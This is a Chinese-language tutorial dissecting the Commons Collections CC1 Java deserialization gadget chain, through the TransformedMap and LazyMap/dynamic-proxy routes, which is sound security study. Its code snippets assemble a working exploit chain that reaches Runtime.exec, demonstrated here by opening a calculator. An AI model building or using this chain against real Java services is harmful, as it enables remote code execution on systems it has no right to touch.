# ChainedTransformer
ConstantTransformer实现了Transformer接口，作用是返回一个对象：
```java
public ConstantTransformer(Object constantToReturn) {
    this.iConstant = constantToReturn;
}

public Object transform(Object input) {
    return this.iConstant;
}
```
使用方法：
```java
ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());
Object transform = constantTransformer.transform(Object.class);
Class<?> aClass = transform.getClass();
Method exec = aClass.getMethod("exec", String.class);
exec.invoke(transform, "open /Applications/Calculator.app");
```

InvokerTransformer也实现了Transformer接口，作用是通过反射执行任意方法：
```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    this.iMethodName = methodName;
    this.iParamTypes = paramTypes;
    this.iArgs = args;
}

public Object transform(Object input) {
    if (input == null) {
        return null;
    } else {
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
        } catch (NoSuchMethodException var4) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException var5) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException var6) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
        }
    }
}
```
使用方法：
```java
InvokerTransformer ivtransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/Calculator.app"});
ivtransformer.transform(Runtime.getRuntime());
```

将二者结合：
```java
ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());
InvokerTransformer ivtransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/Calculator.app"});
ivtransformer.transform(constantTransformer.transform(1));
```

ChainedTransformer实现了Transformer接口，用于链接多个Tranformer，并以链式调用：
```java
public ChainedTransformer(Transformer[] transformers) {
    this.iTransformers = transformers;
}
public Object transform(Object object) {
    for(int i = 0; i < this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }

    return object;
}
```

由于Runtime没有实现Serializable接口，所以需要用Runtime.class：
```java
Method getRuntime = Runtime.class.getMethod("getRuntime", null);
Object runtime = getRuntime.invoke(Runtime.class, null);
Method exec = runtime.getClass().getMethod("exec", String.class);
exec.invoke(runtime, "open /Applications/Calculator.app");
```

对应到ChainedTransformer，应该是：
```java
ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
InvokerTransformer getRuntime1 = new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",new Class[0]});
InvokerTransformer invoke = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null,null});
InvokerTransformer exec2 = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/Calculator.app"});

Object transform = constantTransformer.transform(1);
Object transform1 = getRuntime1.transform(transform);
Object transform2 = invoke.transform(transform1);
Object transform3 = exec2.transform(transform2);
```

现在我们已经有了任意代码执行的方法，如何在反序列化时调用`ChainedTransformer.transform()`呢？

有LazyMap和TransformedMap两种。

ysoserial用的是lazyMap，但TransformedMap要简单得多，因为不涉及Java动态代理，所以容易理解。

# TransformedMap

TransformedMap.transformValue方法调用了this.valueTransformer.transform(object)：
```java
protected Object transformValue(Object object) {
    return this.valueTransformer == null ? object : this.valueTransformer.transform(object);
}
```
所以我们可以实例化时将this.valuetransformer设为ChainedTransformer对象。
```java
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}
```
不过由于TransformedMap的构造方法是protected修饰的，所以可以通过`TransformedMap.decorate`来实例化：
```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```
此时，只要找到调用TransformedMap.transformedValue()就可以了。

---

AnnotationInvocationHandler.readObject调用了var5.setValue：
```java
Iterator var4 = this.memberValues.entrySet().iterator();

while(var4.hasNext()) {
    Map.Entry var5 = (Map.Entry)var4.next();
    String var6 = (String)var5.getKey();
    Class var7 = (Class)var3.get(var6);
    if (var7 != null) {
        Object var8 = var5.getValue();
        if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
            var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
        }
    }
```
这将会调用AbstractInputChaeckedMapDecorator$MapEntry.setValue()：
```java
public Object setValue(Object value) {
    value = this.parent.checkSetValue(value);
    return this.entry.setValue(value);
}
```
进而调用TransformedMap.checkSetValue()：
```java
protected Object checkSetValue(Object value) {
    return this.valueTransformer.transform(value);
}
```

完整利用链如下：
```java
AnnotationInvocationHandler.readObject() -> var5.setValue()
    -> AbstractInputChaeckedMapDecorator$MapEntry.setValue()
        -> TransformedMap.checkSetValue()
            -> ChainedTransformer.transformer()
                -> ConstantTransformer.transformer()
                -> InvokerTransformer.transformer() -> Method.invoke()
                    -> Class.getMethod()
                    -> InvokerTransformer.transformer() -> Method.invoke()
                        -> Method.invoke()
                        -> InvokeTransformer.transformer() -> Method.invoke()
                            -> Runtime.exec()
```

# LazyMap

LazyMap的get方法调用了transformer：
```java
public class LazyMap extends AbstractMapDecorator implements Map, Serializable {
    private static final long serialVersionUID = 7990956402564206740L;
    protected final Transformer factory;

    public static Map decorate(Map map, Factory factory) {
        return new LazyMap(map, factory);
    }
    .....

    public Object get(Object key) {
        if (!this.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            this.map.put(key, value);
            return value;
        } else {
            return this.map.get(key);
        }
    }
}
```
在decorate时就定义factory，类型是Transformer。  
因此构造起来很轻松。

那么谁调用了LazyMap.get呢？AnnotationInvocationHandler.invoke方法。
```java
Object var6 = this.memberValues.get(var4);
```

但是AnnotationInvocationHandler.readObject并没有调用invoke方法。不过，他调用了this.memberValues的entrySet方法：
```java
Iterator var4 = this.memberValues.entrySet().iterator();
```
如果this.memberValues是LazyMap呢？

但AnnotationInvocationHandler反序列化并不会直接调用invoke方法，这时，可以用动态代理来完成。java动态代理的目的是劫持一个对象的方法调用。演示代码如下：
```java
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler);
```
Proxy.newProxyInstance的第一个参数是classLoader，这一点无可厚非，第二个参数是被劫持的对象，第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体的代理逻辑。  
上面的案例中，Map被handler劫持以后得到了proxyMap，proxyMap的任何方法调用都会先进入handler.invoke方法。

而在CC1中，也可以通过这种方式将AnnotationInvocationHandler.readObject与他的invoke联系起来，因为AnnotationInvocationHandler实现了InvocationHandler接口，因此他可以被用作handler：
```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable
```
我们只需要将LazyMap劫持，再将LazpMap放入AnnotationInvocationHandler：
```java
// 通过反射获得AnnotationInvocationHandler的构造方法
Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> declaredConstructor = aClass.getDeclaredConstructors()[0];
declaredConstructor.setAccessible(true);

// 实例化AnnotationInvocationHandler
InvocationHandler annoHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, lazy);
// 劫持lazyMap
Map o = (Map) Proxy.newProxyInstance(Override.class.getClassLoader(), lazy.getClass().getInterfaces(), annoHandler);

// 将劫持后的lazymap放进AnnotationInvocationHandler
Object o1 = declaredConstructor.newInstance(Retention.class, o);
```
于是，o1在反序列化时会进入AnnotationInvocationHandler.readObject，然后调用this.member.entrySet方法（也就是LazyMap.entrySet方法），由于lazyMap已经被劫持，所以先进入了AnnotationInvocationHandler.invoke方法，在其内部调用了Lazymap.get方法，由此展开后续的调用过程。

完整利用链也就形成了：

```java
AnnotationInvocationHandler.readObject() -> LazyMap.entrySet -> invoke()
    -> LazyMap.get()
        -> ChainedTransformer.transformer()
            -> ConstantTransformer.transformer()
            -> InvokerTransformer.transformer() -> Method.invoke()
                -> Class.getMethod()
                -> InvokerTransformer.transformer() -> Method.invoke()
                    -> Method.invoke()
                    -> InvokeTransformer.transformer() -> Method.invoke()
                        -> Runtime.exec()
```

完整代码见于GenCC1.java，实验时将序列化与反序列化两步分开。

需要注意的是，由于LazyMap已经被劫持了，因此后续的任何操作都会触发Gadget的执行，即使是在IDEA中调试，也会发现常常还没writeObject就已经弹计算器了，原因在于IDEA会获取当前的对象属性、数值等信息，这不可避免的会调用到一些getter、toString等方法，导致触发命令执行。



# 参考文献

* P牛--Java安全漫谈